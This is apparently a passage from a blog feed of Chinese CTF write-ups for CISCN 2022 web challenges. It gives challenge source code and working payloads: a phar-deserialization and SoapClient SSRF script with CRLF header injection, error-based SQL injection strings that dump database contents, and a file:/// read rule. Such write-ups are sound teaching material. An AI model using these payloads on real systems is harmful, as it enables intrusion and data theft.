class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用 delete.php 触发 phar</p><p><img src="/../../../../pic/Pasted%20image%2020230215083948.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 2022 初赛</title>
      <link href="/2023/01/21/catchtheflag/games/ciscn/ciscn-2022-chu-sai/"/>
      <url>/2023/01/21/catchtheflag/games/ciscn/ciscn-2022-chu-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2022-初赛"><a href="#CISCN-2022-初赛" class="headerlink" title="CISCN 2022 初赛"></a>CISCN 2022 初赛</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-welcomeToCiscn-150分"><a href="#1-welcomeToCiscn-150分" class="headerlink" title="1. welcomeToCiscn(150分)"></a>1. welcomeToCiscn(150分)</h3><p>随便输一个数进去，页面缩放到最小即可获得flag</p><p>![[../../../../pic/Pasted image 20220619151001.png|L]]</p><h3 id="2-ezphp-300分"><a href="#2-ezphp-300分" class="headerlink" title="2. ezphp(300分)"></a>2. ezphp(300分)</h3><ul><li>题目分析</li></ul><p>存在 uplaod.php ，访问 flag.php 获取到相当于提示的东西</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要从本地访问 flag.php，这就涉及到 SSRF 了</p><ul><li>题目源码</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//设置编码</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"max_execution_time"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;\?|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"go away!!!! hacker"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$filepath</span><span class="token operator">=</span><span class="token string double-quoted-string">"storage/"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/gif"</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$random_name</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">,</span><span class="token variable">$filepath</span><span class="token operator">.</span><span class="token variable">$random_name</span><span class="token operator">.</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"上传成功:路径在: ./"</span><span class="token operator">.</span><span class="token variable">$filepath</span><span class="token operator">.</span><span class="token variable">$random_name</span><span class="token operator">.</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"上传失败"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"invalid gif"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">checkimg</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$check</span><span class="token operator">=</span><span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$check</span><span class="token operator">!=</span><span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$check</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mime'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"safe image"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"go away hacker"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$img</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">checkimg</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">?</span>php<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Mysql</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$conn</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbhost</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbusername</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbpasswd</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbhost'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbusername'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbpasswd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dbhost</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbhost'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dbusername</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbusername'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dbpasswd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dbpasswd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dbhost</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dbusername</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dbpasswd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Connection failed: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>题解</li></ul><p>存在文件上传点，且给了一个类，需要 phar 反序列化 + SoapClient SSRF</p><p>构造payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Mysql</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">conn</span> <span class="token operator">=</span>  <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'http://127.0.0.1/flag.%70%68%70'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'user_agent'</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"ar\r\n"</span> <span class="token operator">.</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span>  <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Cookie: SESSID=ar'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'uri'</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mysql</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件 //签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.phar"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"exp.gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得了一个  exp.gif ，上传到 WEB 页面</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.166.173:58003/upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传成功</p><p>![[../../../../pic/Pasted image 20220619154339.png|L]]</p><p>在 getimagesize() 处触发 phar 反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>img<span class="token operator">=</span>phar<span class="token punctuation">:</span><span class="token comment">//./storage/a82d10f1.gif</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>随后访问 flag.txt 获取 flag</p><h3 id="3-ezsql-300分"><a href="#3-ezsql-300分" class="headerlink" title="3. ezsql(300分)"></a>3. ezsql(300分)</h3><ul><li>题目分析</li></ul><p>在用户注册位置存在 SQL 报错注入</p><ul><li>题解</li></ul><p>获取全部数据库</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">' or updatexml(1,concat(0x7e,right((select group_concat(schema_name)from information_schema.schemata),20)),0) or '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220619155023.png|L]]</p><p>获取表</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">' or updatexml(1,concat(0x7e,right((select group_concat(table_name)from information_schema.tables where table_schema='</span>f0ig_wdp435s<span class="token string single-quoted-string">'),20)),0) or '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取列</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">' or updatexml(1,concat(0x7e,right((select group_concat(column_name)from information_schema.columns where table_schema='</span>f0ig_wdp435s<span class="token string single-quoted-string">'AND table_name='</span>fllaaagggg<span class="token string single-quoted-string">'),20)),0) or '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取内容</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">' or updatexml(1,concat(0x7e,right((select group_concat(`FI@g`)from `f0ig_wdp435s`.`fllaaagggg`),20)),0) or '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">' or updatexml(1,concat(0x7e,left((select group_concat(`FI@g`)from `f0ig_wdp435s`.`fllaaagggg`),20)),0) or '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将两次获取到的内容组合起来即为 flag</p><h3 id="4-会聊天的ctf-600分"><a href="#4-会聊天的ctf-600分" class="headerlink" title="4. 会聊天的ctf(600分)"></a>4. 会聊天的ctf(600分)</h3><ul><li>题目分析</li></ul><p>![[../../../../pic/Pasted image 20220619150303.png|L]]</p><p>可以通过 URL 获取图片，推测为使用 file_get_contents() ,include()，之类的函数进行读取，构造任意文件读取 payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">[</span>规则<span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string double-quoted-string">"image"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"file:///var/www/html/api.php"</span><span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">[</span>提交<span class="token punctuation">]</span> aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取到的图片的 base64 中含有 api.php 文件源码，解码后获得 api.php 文件</p><ul><li>题目源码</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$sesspath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/session"</span><span class="token punctuation">;</span>    <span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token variable">$sesspath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ck'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_dir_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/tmp/resource"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/tmp/resource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">file_dir_exists</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token operator">-&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">getres</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">log_write</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/tmp/resource/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_dir_exists</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"请先上传词库文件。"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$ck</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$ck</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">key</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token variable">$type</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string double-quoted-string">"string"</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token variable">$v</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string double-quoted-string">"image"</span><span class="token punctuation">:</span>                    <span class="token variable">$b64img</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;img src="data:image/png;base64,'</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"/&gt;'</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token variable">$b64img</span><span class="token punctuation">;</span>                <span class="token 